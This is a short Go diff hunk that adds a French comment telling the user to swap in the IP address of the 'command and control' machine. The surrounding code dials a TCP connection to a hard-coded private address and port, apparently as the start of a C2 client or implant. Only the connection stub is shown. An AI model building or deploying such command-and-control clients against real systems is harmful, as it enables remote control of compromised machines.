@@ -7,6 +7,7 @@ import (
 )
 
 func main() {
+    //modifier l'adresse ip ci-dessous par l'adresse ip de la machine command and control
     conn, err := net.Dial("tcp", "192.168.17.1:8080")
     if err != nil {
         os.Exit(1)
